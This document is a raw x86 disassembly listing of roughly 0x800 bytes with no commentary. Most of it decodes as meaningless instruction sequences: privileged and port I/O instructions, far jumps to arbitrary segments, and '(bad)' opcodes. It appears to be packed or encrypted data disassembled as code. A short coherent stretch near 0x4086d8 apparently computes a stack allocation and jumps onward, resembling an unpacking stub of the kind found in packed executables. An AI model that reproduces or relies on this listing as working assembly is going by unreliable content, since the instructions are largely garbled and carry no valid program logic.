  40815b:	lods   al,BYTE PTR ds:[esi]
  40815c:	sbb    esi,ebp
  40815e:	add    ebx,DWORD PTR [edx+0x3b]
  408161:	out    0x26,al
  408163:	mov    cl,0xc6
  408165:	inc    edi
  408166:	dec    edi
  408167:	dec    edx
  408168:	test   BYTE PTR [ecx+0x29],ah
  40816b:	mov    al,0x8f
  40816d:	xchg   ecx,eax
  40816e:	cmp    edi,DWORD PTR ds:0xb13344f6
  408174:	inc    ebx
  408175:	and    DWORD PTR [esi],edx
  408177:	cmp    al,0x69
  408179:	gs clc 
  40817b:	jg     0x4081f5
  40817d:	pop    esi
  40817e:	sub    bh,BYTE PTR [ecx]
  408180:	add    DWORD PTR [ebx+edx*2],esi
  408183:	sbb    al,BYTE PTR [esi]
  408185:	sar    DWORD PTR [edi-0x76],0x4a
  408189:	in     al,dx
  40818a:	mov    eax,ds:0xc9fa5722
  40818f:	pop    esi
  408190:	dec    DWORD PTR [ebx+0x4705cda1]
  408196:	test   esp,0x2be0a316
  40819c:	cli    
  40819d:	mov    ecx,0x80db85ab
  4081a2:	stos   DWORD PTR es:[edi],eax
  4081a3:	cmp    edi,DWORD PTR [edi+ecx*1+0x49f174e4]
  4081aa:	ja     0x4081a1
  4081ac:	nop
  4081ad:	sbb    DWORD PTR [ebp-0x73],edx
  4081b0:	jmp    0xfea:0x55c989b4
  4081b7:	add    eax,0x362c19f2
  4081bc:	pop    ss
  4081bd:	call   0xd50364b6
  4081c2:	inc    esp
  4081c3:	es in  eax,dx
  4081c5:	ss jno 0x4081bc
  4081c8:	retf   0x8a7e
  4081cb:	pop    edi
  4081cc:	or     BYTE PTR [edx-0x7],ah
  4081cf:	jns    0x40820d
  4081d1:	xor    cl,ch
  4081d3:	sbb    al,0x22
  4081d5:	mov    eax,ds:0xde923550
  4081da:	imul   ebp,DWORD PTR [eax],0x1d
  4081dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081de:	in     al,dx
  4081df:	mov    ecx,0xcc8d3420
  4081e4:	xor    DWORD PTR [esp+ecx*2-0x4e323d90],0xc9a8d611
  4081ef:	ss jmp 0x68e25bb0
  4081f5:	push   0xf6c102f7
  4081fa:	outs   dx,DWORD PTR ds:[esi]
  4081fb:	mov    ds,WORD PTR [ebx+0x4c16f87a]
  408201:	call   0x895bef3a
  408206:	xchg   ebp,eax
  408207:	adc    DWORD PTR ds:0xf523e716,ebp
  40820d:	xlat   BYTE PTR ds:[ebx]
  40820e:	mov    ch,0xdc
  408210:	rcl    DWORD PTR [edi],1
  408212:	test   BYTE PTR [ebx-0x7c0cb265],dl
  408218:	add    BYTE PTR [eax-0x7b65d59e],0x66
  40821f:	sub    ebp,ecx
  408221:	aas    
  408222:	dec    DWORD PTR [ebx+0x37]
  408225:	xchg   DWORD PTR [ebx+0x69bd5244],esp
  40822b:	jbe    0x40828f
  40822d:	jo     0x408205
  40822f:	mov    ds:0x9bf6c197,eax
  408234:	ins    DWORD PTR es:[edi],dx
  408235:	clc    
  408236:	bound  edx,QWORD PTR ds:0x5da2ac78
  40823c:	dec    edi
  40823d:	pop    edx
  40823e:	pop    esi
  40823f:	mov    ah,0xc0
  408241:	sub    al,0x9a
  408243:	loopne 0x40822e
  408245:	es hlt 
  408247:	mov    DWORD PTR [edx],eax
  408249:	mov    bl,0xa8
  40824b:	mov    dl,0x4a
  40824d:	data16 ror BYTE PTR es:[eax-0xafc2b99],0xfa
  408256:	jge    0x40824f
  408258:	rcr    DWORD PTR [edi],0xc
  40825b:	sub    edi,ecx
  40825d:	mov    dl,0x3d
  40825f:	test   BYTE PTR [ebx],al
  408261:	(bad)  
  408263:	sbb    eax,0x4f2c1aa8
  408268:	pusha  
  408269:	out    0x60,al
  40826b:	clc    
  40826c:	xor    BYTE PTR [eax],0x6a
  40826f:	lds    ecx,FWORD PTR [bp+si-0x5133]
  408274:	push   edx
  408275:	push   esp
  408276:	or     al,0xe7
  408278:	scas   al,BYTE PTR es:[edi]
  408279:	clc    
  40827a:	jo     0x408283
  40827c:	repz mov edx,0x3603142b
  408282:	mov    ss,WORD PTR [edx]
  408284:	stos   BYTE PTR es:[edi],al
  408285:	mov    bl,dl
  408287:	cmp    DWORD PTR [ebx+0x612e72c6],ebp
  40828d:	hlt    
  40828e:	test   eax,0xdbcd918
  408293:	(bad)  
  408295:	and    al,BYTE PTR ds:0xc20f3344
  40829b:	or     eax,0x870e90a6
  4082a0:	ror    esi,0x64
  4082a3:	sbb    DWORD PTR [edi+0x3841747d],ebx
  4082a9:	outs   dx,BYTE PTR ds:[esi]
  4082aa:	out    dx,eax
  4082ab:	jno    0x408231
  4082ad:	ja     0x408325
  4082af:	push   ss
  4082b0:	xchg   ecx,eax
  4082b1:	daa    
  4082b2:	sbb    BYTE PTR ss:[edi],dh
  4082b5:	xchg   esp,eax
  4082b6:	fidivr WORD PTR ds:0xb5fe2af4
  4082bc:	int3   
  4082bd:	fs lock jl 0x4082da
  4082c1:	inc    ebx
  4082c2:	stos   BYTE PTR es:[edi],al
  4082c3:	bound  esp,QWORD PTR [esp+esi*4]
  4082c6:	push   eax
  4082c7:	fadd   QWORD PTR [edi+0x1f22202d]
  4082cd:	repz sbb edi,esi
  4082d0:	add    ebx,DWORD PTR [eax+0x4e]
  4082d3:	mov    BYTE PTR [ecx-0x53],bh
  4082d6:	dec    esi
  4082d7:	popf   
  4082d8:	mov    ebp,0x828532bd
  4082dd:	ret    0x2559
  4082e0:	retf   0x163d
  4082e3:	adc    al,0x7a
  4082e5:	cwde   
  4082e6:	jge    0x408314
  4082e8:	int    0x30
  4082ea:	mov    bh,0x87
  4082ec:	mov    ebp,0xe19b89c6
  4082f1:	jnp    0x4082e1
  4082f3:	mov    eax,ds:0x24cab967
  4082f8:	stos   DWORD PTR es:[edi],eax
  4082f9:	mov    ebp,ecx
  4082fb:	mov    bl,0xfa
  4082fd:	adc    BYTE PTR [edi],bh
  4082ff:	dec    ebp
  408300:	aad    0x24
  408302:	dec    ebp
  408303:	push   esi
  408304:	xchg   edi,eax
  408305:	xchg   al,bh
  408307:	(bad)
  40830a:	push   ebp
  40830b:	mov    bh,0x7f
  40830d:	test   DWORD PTR [esi+ecx*1],edx
  408310:	vmovlps xmm0,xmm6,QWORD PTR [ebx+0x47]
  408315:	in     eax,dx
  408316:	push   edi
  408317:	int3   
  408318:	xchg   ebx,eax
  408319:	mov    ch,0x79
  40831b:	sub    al,0x79
  40831d:	inc    ecx
  40831e:	sub    ch,BYTE PTR [edi]
  408320:	sbb    esi,DWORD PTR [ecx+eiz*4-0x273d0bf9]
  408327:	aaa    
  408328:	retf   
  408329:	fidiv  DWORD PTR [eax]
  40832b:	cdq    
  40832c:	adc    bl,dh
  40832e:	addr16 pop esp
  408330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408331:	retf   0x39c2
  408334:	jge    0x4082f8
  408336:	sub    ebp,DWORD PTR [eax+0xa34cbc7]
  40833c:	sbb    eax,esp
  40833e:	mov    DWORD PTR [esi-0x45],ebp
  408341:	pusha  
  408342:	dec    esi
  408343:	fist   DWORD PTR [ebx-0x4d]
  408346:	dec    ebp
  408347:	sub    eax,0xf4a1859a
  40834c:	lods   al,BYTE PTR ds:[esi]
  40834d:	xor    al,0x6e
  40834f:	hlt    
  408350:	pop    esp
  408351:	test   BYTE PTR [ebx+0x29a9de7f],bl
  408357:	ss xchg ebx,eax
  408359:	shr    eax,1
  40835b:	(bad)  
  40835c:	sbb    eax,0x2f6b00d
  408361:	dec    esp
  408362:	push   esp
  408363:	sahf   
  408364:	sbb    esi,esi
  408366:	retf   0x152b
  408369:	mov    ds:0x66bb0f04,eax
  40836e:	scas   al,BYTE PTR es:[edi]
  40836f:	iret   
  408370:	loop   0x408337
  408372:	jl     0x408380
  408374:	scas   eax,DWORD PTR es:[edi]
  408375:	fbstp  TBYTE PTR gs:[esi+0x4c3f84fe]
  40837c:	and    ch,0xea
  40837f:	addr16 in eax,0x5d
  408382:	shr    BYTE PTR [esp+ecx*4+0x19],1
  408386:	jecxz  0x40836c
  408388:	sub    ebp,DWORD PTR [edi-0x7939c63b]
  40838e:	xchg   ebp,eax
  40838f:	out    dx,al
  408390:	out    0xca,al
  408392:	(bad)  
  408393:	mov    ds:0x34efb2f0,eax
  408398:	add    ah,BYTE PTR [edi-0x45]
  40839b:	ficom  WORD PTR [edx+0x17]
  40839e:	ja     0x4083f2
  4083a0:	xor    al,ah
  4083a2:	cmc    
  4083a3:	lods   al,BYTE PTR ds:[esi]
  4083a4:	mov    dh,0xce
  4083a7:	fs jmp 0xdca4:0x9371aa58
  4083af:	xchg   ebp,eax
  4083b0:	or     bh,BYTE PTR [esi-0x1c277dcd]
  4083b6:	sbb    eax,0x8f73ed3
  4083bb:	xchg   esp,eax
  4083bc:	mov    cl,bh
  4083be:	hlt    
  4083bf:	pop    ss
  4083c0:	ror    DWORD PTR [ebx+0x12],cl
  4083c3:	mov    edx,0x6d082683
  4083c8:	sub    eax,0xd506fb48
  4083cd:	push   eax
  4083ce:	xchg   ebp,eax
  4083cf:	ins    BYTE PTR es:[edi],dx
  4083d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083d1:	sti    
  4083d2:	sub    BYTE PTR [ebx-0x75ff1e4f],0x3f
  4083d9:	je     0x408393
  4083db:	xchg   esp,eax
  4083dc:	inc    esp
  4083dd:	repnz mov bl,0x88
  4083e0:	pop    esi
  4083e1:	cbw    
  4083e3:	je     0x408425
  4083e5:	push   eax
  4083e6:	push   eax
  4083e7:	fld    DWORD PTR [eax]
  4083e9:	pop    edi
  4083ea:	outs   dx,BYTE PTR ds:[esi]
  4083eb:	pop    es
  4083ec:	jo     0x408464
  4083ee:	ins    BYTE PTR es:[edi],dx
  4083ef:	and    edx,ebx
  4083f1:	or     bl,BYTE PTR [eax-0x23a10b3]
  4083f7:	popf   
  4083f8:	mov    BYTE PTR [esi+0x44b3d9a8],bh
  4083fe:	xor    DWORD PTR [eax+ebp*4+0x1c],esi
  408402:	sbb    bh,BYTE PTR [ebx-0x2fe6095f]
  408408:	and    BYTE PTR [edi+0x63],cl
  40840b:	popa   
  40840c:	jo     0x40842b
  40840e:	lahf   
  40840f:	jae    0x4083d5
  408411:	stos   DWORD PTR es:[edi],eax
  408412:	xor    al,0x34
  408414:	xchg   esp,eax
  408415:	pop    ebp
  408416:	dec    eax
  408417:	stc    
  408418:	int    0xe1
  40841a:	lahf   
  40841b:	pop    eax
  40841c:	sbb    DWORD PTR [esp+ecx*1-0x50],edi
  408420:	lahf   
  408421:	pop    ebp
  408422:	mov    dl,0xf0
  408424:	xchg   DWORD PTR [ecx+0xfb0d69a],ebx
  40842a:	add    bl,BYTE PTR [edx+esi*8-0x34]
  40842e:	(bad)
  408433:	sub    DWORD PTR [ebp+0x2e],esi
  408436:	or     ch,BYTE PTR [eax+0x29225ebc]
  40843c:	sbb    DWORD PTR [edi-0x70],0x1f
  408440:	xor    al,0x6f
  408442:	je     0x408439
  408444:	add    eax,0x1fa70479
  408449:	dec    ebp
  40844a:	xchg   DWORD PTR [eax+eiz*1+0x18],ebx
  40844e:	xchg   edx,eax
  40844f:	jmp    0x408455
  408451:	adc    al,0xd
  408453:	in     eax,dx
  408454:	test   BYTE PTR [esp+edx*2+0x40],bl
  408458:	enter  0xff2f,0xc6
  40845c:	or     ebp,DWORD PTR [edx-0x262c2231]
  408462:	pop    ecx
  408463:	sbb    al,0xb5
  408465:	dec    esp
  408466:	mov    eax,ds:0x3015c22d
  40846b:	stos   BYTE PTR es:[edi],al
  40846c:	les    edi,FWORD PTR [ecx-0x78]
  40846f:	call   0xd4ff:0x4aabf143
  408476:	adc    eax,0xbc250d26
  40847b:	std    
  40847c:	and    al,0x1
  40847e:	fld    TBYTE PTR [ebx-0x61e2bbf4]
  408484:	add    al,0x16
  408486:	das    
  408487:	and    al,BYTE PTR [esi]
  408489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40848a:	push   esi
  40848b:	loop   0x408498
  40848d:	sbb    edi,edx
  40848f:	add    al,0xad
  408491:	push   edi
  408492:	jbe    0x408480
  408494:	cli    
  408495:	call   0xf4d28c41
  40849a:	adc    BYTE PTR [ebp+eax*1-0xd7a7820],al
  4084a1:	sbb    bh,dh
  4084a3:	inc    esi
  4084a4:	inc    edx
  4084a5:	sbb    eax,0x99a4dc5f
  4084aa:	mov    bl,0x39
  4084ac:	or     eax,0x54a1b13b
  4084b1:	xor    ch,ah
  4084b3:	(bad)  
  4084b4:	daa    
  4084b5:	mov    edx,0xe2e6eb06
  4084ba:	fistp  QWORD PTR [ebx+0x71]
  4084bd:	xor    edx,DWORD PTR [ebx+0x38]
  4084c0:	pushf  
  4084c1:	inc    eax
  4084c2:	inc    ecx
  4084c3:	(bad)  
  4084c4:	adc    ch,BYTE PTR [edx]
  4084c6:	and    eax,0x15fe719b
  4084cb:	sahf   
  4084cc:	and    BYTE PTR [ebx+eiz*4-0x4e],0x2b
  4084d1:	mov    bl,BYTE PTR [ecx]
  4084d3:	cdq    
  4084d4:	call   0xbca5:0xc81e7cbf
  4084db:	jmp    0x408523
  4084dd:	scas   al,BYTE PTR es:[edi]
  4084de:	shl    eax,0xdc
  4084e1:	push   ds
  4084e2:	xchg   edi,eax
  4084e3:	xor    dh,ah
  4084e5:	das    
  4084e6:	repnz push edi
  4084e8:	int    0x34
  4084ea:	retf   0xa0ff
  4084ed:	add    ebx,DWORD PTR ds:0xc03c6603
  4084f3:	mov    cl,0xb3
  4084f5:	imul   esp,DWORD PTR [ebx-0xf],0x315f6845
  4084fc:	mov    al,ds:0x32aa52c0
  408501:	test   ah,cl
  408503:	das    
  408504:	cmp    al,0x39
  408506:	ds dec ebx
  408508:	cmp    ah,BYTE PTR [ecx+0x4cb1605a]
  40850e:	sub    bh,BYTE PTR [edx-0x31]
  408511:	test   eax,0x6f16ca34
  408516:	scas   eax,DWORD PTR es:[edi]
  408517:	and    BYTE PTR ds:0x1876a5de,bh
  40851d:	mov    ebp,0xfadb0744
  408522:	mov    ds:0x53e841b5,al
  408527:	out    0xd5,eax
  408529:	js     0x4085aa
  40852b:	or     DWORD PTR [ecx+0x56fb52c1],esp
  408531:	pop    esp
  408532:	lods   eax,DWORD PTR ds:[esi]
  408533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408534:	dec    edi
  408535:	loope  0x408574
  408537:	mov    dh,0x8e
  408539:	stos   BYTE PTR es:[edi],al
  40853a:	add    DWORD PTR [edx+0x5c0e878d],edx
  408540:	jno    0x40857e
  408542:	mov    ch,BYTE PTR [esi-0x183484d3]
  408548:	scas   al,BYTE PTR es:[edi]
  408549:	xchg   edx,eax
  40854a:	fmul   st,st(2)
  40854c:	jle    0x4084e4
  40854e:	pop    esi
  40854f:	shl    DWORD PTR [eax-0x73623fec],cl
  408555:	mov    esp,0xf2525b73
  40855a:	inc    edx
  40855b:	repz push esi
  40855d:	xor    ecx,DWORD PTR [edi+0x5d]
  408560:	push   esi
  408561:	adc    al,0x49
  408563:	pop    eax
  408564:	push   ecx
  408565:	popf   
  408566:	jle    0x4085c7
  408568:	sub    eax,0x7a4bafcf
  40856d:	fs and al,0xa1
  408570:	call   0x9aa3cf50
  408575:	mov    bh,BYTE PTR [edx]
  408577:	jnp    0x408508
  408579:	cmp    BYTE PTR [ebp+eiz*1-0x7511eb32],dh
  408580:	inc    edx
  408581:	test   edi,0x867d6459
  408587:	and    al,0x9a
  408589:	fadd   QWORD PTR [edx-0x695697db]
  40858f:	ss aaa 
  408591:	data16 fistp WORD PTR [eax-0x33a266c4]
  408598:	cmp    ecx,DWORD PTR [edi-0x2c667313]
  40859e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40859f:	or     esi,DWORD PTR [edx-0x34]
  4085a2:	pushf  
  4085a3:	es dec edx
  4085a5:	push   esp
  4085a6:	retf   0x3e83
  4085a9:	popa   
  4085aa:	cmp    BYTE PTR [ebx-0x35de2683],0x2d
  4085b1:	mov    eax,ds:0x13f63083
  4085b6:	in     al,dx
  4085b7:	pop    esi
  4085b8:	rol    BYTE PTR [ebp+0x1e],0xc4
  4085bc:	stos   DWORD PTR es:[edi],eax
  4085bd:	adc    al,0xd3
  4085bf:	iret   
  4085c0:	mov    bh,0x8
  4085c2:	mov    bl,0xaa
  4085c4:	sti    
  4085c5:	les    edi,FWORD PTR [ebp+0x26]
  4085c8:	arpl   WORD PTR [edi-0x3e],bp
  4085cb:	push   edx
  4085cc:	mov    cl,0xe
  4085ce:	lods   eax,DWORD PTR ds:[esi]
  4085cf:	or     edi,DWORD PTR [edi-0x2b]
  4085d2:	shr    BYTE PTR [ebp-0x62],1
  4085d5:	pop    ebx
  4085d6:	push   cs
  4085d7:	popa   
  4085d8:	(bad)  
  4085d9:	call   0x77c859fa
  4085de:	push   ebx
  4085df:	pop    esp
  4085e0:	mov    edi,0xb7d3615a
  4085e5:	jmp    0x1b7f:0xc1ac0270
  4085ec:	adc    edx,ecx
  4085ee:	fisub  WORD PTR [esi+ebx*8]
  4085f1:	outs   dx,BYTE PTR ds:[esi]
  4085f2:	fpatan 
  4085f4:	in     eax,dx
  4085f5:	popf   
  4085f6:	clc    
  4085f7:	call   DWORD PTR [ebp+0x5608bc1d]
  4085fd:	push   edx
  4085fe:	xor    al,0x68
  408600:	ret    0x5797
  408603:	pop    ecx
  408604:	mov    eax,0x5f894f98
  408609:	das    
  40860a:	mov    ah,0x35
  40860c:	das    
  40860d:	sub    DWORD PTR ds:0xf94dfe2e,eax
  408613:	sbb    al,BYTE PTR [eax+edx*2-0xb]
  408617:	inc    ebp
  408618:	cld    
  408619:	aad    0xa5
  40861b:	out    dx,eax
  40861c:	and    DWORD PTR [ebx+0x6e],esp
  40861f:	push   esi
  408620:	xchg   DWORD PTR [eax+eax*4+0x65],esi
  408624:	sbb    al,0x6c
  408626:	cmp    ebp,esi
  408628:	xor    BYTE PTR [edx],dh
  40862a:	scas   eax,DWORD PTR es:[edi]
  40862b:	pusha  
  40862c:	pop    ss
  40862d:	icebp  
  40862e:	or     BYTE PTR [ebp+0x39],cl
  408631:	cmp    cl,bh
  408633:	lods   al,BYTE PTR ds:[esi]
  408634:	sbb    DWORD PTR [edi+0x13],edi
  408637:	jo     0x408680
  408639:	mov    ebx,0xcc8374b3
  40863e:	hlt    
  40863f:	push   ss
  408640:	push   eax
  408641:	adc    al,0x61
  408643:	sbb    BYTE PTR [eax+0x245fcb07],dh
  408649:	idiv   ebx
  40864b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40864c:	or     DWORD PTR [edx-0x53],0x30f9c387
  408653:	pusha  
  408654:	sbb    esp,DWORD PTR [edx-0x55]
  408657:	shl    DWORD PTR [ebp-0x5b9a6c59],1
  40865d:	int    0x37
  40865f:	mov    ch,0xd4
  408661:	enter  0xb116,0x14
  408665:	sbb    eax,0x44b88da3
  40866a:	dec    esp
  40866b:	std    
  40866c:	test   DWORD PTR [edi],0x3fb3d586
  408672:	sbb    DWORD PTR [eax+0x30],esp
  408675:	sahf   
  408676:	nop
  408677:	fnsave [edx+0x5f95322c]
  40867d:	jle    0x4086a3
  40867f:	push   cs
  408680:	sub    DWORD PTR [ecx*2+0x7df11aa4],0xffffff98
  408688:	sub    DWORD PTR [edx-0x42916cfa],ebp
  40868e:	leave  
  40868f:	sub    al,0x19
  408691:	loopne 0x408621
  408693:	popa   
  408694:	sti    
  408695:	sbb    al,cl
  408697:	sar    DWORD PTR [ebx],1
  408699:	aam    0x28
  40869b:	in     al,dx
  40869c:	or     ebp,DWORD PTR [esi]
  40869e:	cwde   
  40869f:	sbb    esp,edi
  4086a1:	or     eax,0xf37fd682
  4086a6:	not    DWORD PTR [edx+ebp*2-0xfd76805]
  4086ad:	lahf   
  4086ae:	int3   
  4086af:	pushf  
  4086b0:	inc    ebx
  4086b1:	gs push 0xd2c063db
  4086b7:	(bad)  
  4086b8:	ins    DWORD PTR es:[edi],dx
  4086b9:	or     ecx,esp
  4086bb:	push   ebx
  4086bc:	call   0xe89d:0xd760cbaf
  4086c3:	pop    ss
  4086c4:	lea    edi,[bx-0xcc7]
  4086c9:	ins    BYTE PTR es:[edi],dx
  4086ca:	jg     0x408735
  4086cc:	imul   dl
  4086ce:	sub    DWORD PTR [esi],eax
  4086d0:	cmp    ebx,ecx
  4086d2:	or     eax,DWORD PTR [eax-0x3a3685e2]
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x50165bd9
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  ebx,QWORD PTR ds:0x81aa8d83
  408723:	mov    ds:0x7ede1ba5,al
  408728:	cmp    bl,bh
  40872a:	and    DWORD PTR [eax+0x604e807c],edx
  408730:	push   eax
  408731:	cmp    dl,BYTE PTR [esi+0x71]
  408734:	jno    0x408778
  408736:	repz cli 
  408738:	mov    al,0x18
  40873a:	mov    ebx,esi
  40873c:	sbb    BYTE PTR [ebx+0x5962e3ec],ah
  408742:	inc    esp
  408743:	jo     0x408753
  408745:	imul   BYTE PTR [edi+0x57f12eba]
  40874b:	dec    eax
  40874c:	dec    esi
  40874d:	rol    BYTE PTR [edx+0x28],1
  408750:	adc    eax,0x32e091d9
  408755:	xchg   ecx,eax
  408756:	loope  0x408765
  408758:	fwait
  408759:	les    ebp,FWORD PTR [esi-0x1b]
  40875c:	pop    ecx
  40875d:	mov    ecx,0xdb51d334
  408762:	daa    
  408763:	call   0xef6c:0x46979b1e
  40876a:	fisttp DWORD PTR [ebx+0x16]
  40876d:	lods   eax,DWORD PTR ds:[esi]
  40876e:	jae    0x4086f4
  408770:	push   ebp
  408771:	xchg   edx,eax
  408772:	inc    edi
  408773:	add    bh,bl
  408775:	add    DWORD PTR [ebp-0x4010b5bc],ebp
  40877b:	add    al,0xb9
  40877d:	cld    
  40877e:	clc    
  40877f:	and    bl,BYTE PTR [ebx]
  408781:	inc    ebx
  408782:	jge    0x4087a9
  408784:	sub    DWORD PTR fs:[ecx+ecx*1+0x4e29a6e6],edx
  40878c:	(bad)  
  40878d:	and    ah,BYTE PTR [ecx]
  40878f:	test   DWORD PTR [ecx],ebx
  408791:	sub    eax,0x31ffaf6d
  408796:	out    0x99,eax
  408798:	sti    
  408799:	pop    ebx
  40879a:	add    al,0x7e
  40879c:	push   0x71cca77d
  4087a1:	xor    al,0x24
  4087a3:	or     al,0xe6
  4087a5:	cs cmc 
  4087a7:	inc    ecx
  4087a8:	cli    
  4087a9:	in     al,0xfc
  4087ab:	das    
  4087ac:	cmp    esi,DWORD PTR [ecx+0x2f8f5118]
  4087b2:	add    eax,0x882f0ed9
  4087b7:	(bad)
  4087ba:	and    ah,BYTE PTR [eax+0x5f043622]
  4087c0:	mov    bh,0xeb
  4087c2:	and    al,0xdd
  4087c4:	push   ebx
  4087c5:	mov    ds,esp
  4087c7:	test   al,0xfa
  4087c9:	jmp    0x40875e
  4087cb:	iret   
  4087cc:	adc    eax,DWORD PTR [ebp-0x43]
  4087cf:	push   ds
  4087d0:	mov    edx,0xfa2cf8c9
  4087d5:	jb     0x408802
  4087d7:	idiv   BYTE PTR [ebp+0x2a]
  4087da:	jp     0x4087f4
  4087dc:	xor    cl,BYTE PTR [edi-0xa212a63]
  4087e2:	fwait
  4087e3:	pop    eax
  4087e4:	pop    edx
  4087e5:	xchg   ecx,eax
  4087e6:	shl    DWORD PTR [ebp-0xf],cl
  4087e9:	dec    ebp
  4087ea:	or     DWORD PTR [ebx-0x4f],0xfc47eb25
  4087f1:	scas   eax,DWORD PTR es:[edi]
  4087f2:	das    
  4087f3:	(bad)  
  4087f4:	aam    0xfe
  4087f6:	add    BYTE PTR [esi+0x7139114e],bl
  4087fc:	mov    BYTE PTR [ebx+eax*8-0x104f383],al
  408803:	dec    edi
  408804:	adc    al,0x6e
  408806:	pop    edx
  408807:	inc    ebx
  408808:	dec    eax
  408809:	scas   al,BYTE PTR es:[edi]
  40880a:	ds jmp 0x40884e
  40880d:	cmp    BYTE PTR [eax+eiz*8-0x5c8ad15e],0x5d
  408815:	cdq    
  408816:	mov    ch,0xc8
  408818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408819:	pop    eax
  40881a:	jl     0x40886e
  40881c:	push   edi
  40881d:	mov    esp,0x5e8b7208
  408822:	lods   eax,DWORD PTR ds:[esi]
  408823:	mov    ebx,0xd3497f90
  408828:	pop    ds
  408829:	popa   
  40882a:	test   al,0x15
  40882c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40882d:	mov    edx,0x25b67173
  408832:	bnd je 0x408824
  408835:	mov    eax,0x2b9ed9f1
  40883a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40883b:	in     al,0x6d
  40883d:	xchg   ebp,eax
  40883e:	gs in  eax,0xe1
  408841:	or     edx,DWORD PTR [esi]
  408843:	sub    edx,DWORD PTR [edi-0x19b53f2]
  408849:	and    dl,BYTE PTR [esi-0x5f49f1f9]
  40884f:	or     al,0xed
  408851:	xor    DWORD PTR [eax],esi
  408853:	enter  0x9cdc,0x9c
  408857:	repz iret 
  408859:	retf   0xb2ba
  40885c:	dec    ebx
  40885d:	xor    ebp,eax
  40885f:	pushf  
  408860:	mov    esp,0x4c97041a
  408865:	xchg   ebp,eax
  408866:	inc    edi
  408867:	aam    0xb5
  408869:	in     eax,0x2d
  40886b:	shl    BYTE PTR [ebp-0x6047007d],cl
  408871:	jbe    0x40885e
  408873:	add    eax,0xed116a3a
  408878:	loope  0x408809
  40887a:	mov    ch,0xb7
  40887c:	mov    ah,BYTE PTR ss:[ebp+0x591822b3]
  408883:	pop    edi
  408884:	dec    ebp
  408885:	lea    ebp,[ecx+0x1669e752]
  40888b:	ds add al,0x60
  40888e:	sub    al,0x94
  408890:	shl    BYTE PTR [eax-0x75a05808],0xfc
  408897:	push   ebp
  408898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408899:	cs push eax
  40889b:	nop
  40889c:	add    esi,DWORD PTR [esi]
  40889e:	repnz test al,dl
  4088a1:	dec    ebx
  4088a2:	mov    eax,DWORD PTR [edi+ebx*1+0x1a]
  4088a6:	xor    BYTE PTR [esi-0xb7c93f1],ch
  4088ac:	cdq    
  4088ad:	(bad)  
  4088ae:	leave  
  4088af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b0:	cmp    BYTE PTR [esi-0x77a0d021],al
  4088b6:	xchg   ebp,eax
  4088b7:	pop    edi
  4088b8:	int    0x41
  4088ba:	cmp    al,0xdb
  4088bc:	and    ebx,ebx
  4088be:	addr16 hlt 
  4088c0:	inc    ebx
  4088c1:	ret    0x65ed
  4088c4:	gs or  al,0x69
  4088c7:	jb     0x4088e3
  4088c9:	es jl  0x408889
  4088cc:	pop    edx
  4088cd:	mov    edi,0x91a67c8d
  4088d2:	xor    al,0x2d
  4088d4:	fcom   QWORD PTR [esi+0x5a]
  4088d7:	sbb    edi,DWORD PTR [edx-0xe]
  4088da:	mov    ecx,0xde64cf6a
  4088df:	pop    ds
  4088e0:	dec    esi
  4088e1:	lods   al,BYTE PTR ds:[esi]
  4088e2:	and    al,0x77
  4088e4:	sahf   
  4088e5:	frstor [edx-0x6606baf7]
  4088eb:	dec    ebx
  4088ec:	daa    
  4088ed:	clc    
  4088ee:	jl     0x4088a8
  4088f0:	aas    
  4088f1:	test   eax,0xa85eb568
  4088f6:	xchg   DWORD PTR [eax+esi*4-0xfe205b2],esi
  4088fd:	xchg   edi,eax
  4088fe:	sbb    eax,0x4e1c0ed2
  408903:	gs int 0x5
  408906:	sti    
  408907:	bound  eax,QWORD PTR [ebx-0x5a6ace6]
  40890d:	mov    al,0xe
  40890f:	push   ebp
  408910:	int    0x68
  408912:	in     eax,dx
  408913:	mov    bl,0xfe
  408915:	mov    edx,DWORD PTR [eax+0x242932ed]
  40891b:	imul   edx,DWORD PTR [ebx-0x61206373],0xffffffbf
  408922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408923:	mov    es,WORD PTR [edx-0x744758aa]
  408929:	cmp    DWORD PTR [ecx],ecx
  40892b:	or     dh,dl
  40892d:	jno    0x408962
  40892f:	jmp    0xd2c6:0xfd5ea17d
  408936:	xchg   DWORD PTR [esi+0x72],edx
  408939:	nop
  40893a:	cmp    al,0x67
  40893c:	and    eax,edx
  40893e:	sub    al,0x8b
  408940:	ret    0x52a4
  408943:	mov    ah,0x3f
  408945:	push   ebx
  408946:	fsubp  st(5),st
  408948:	in     eax,dx
  408949:	addr16 pop ebx
  40894b:	inc    esi
  40894c:	dec    esp
  40894d:	sbb    al,0x72
  40894f:	icebp  
  408950:	lahf   
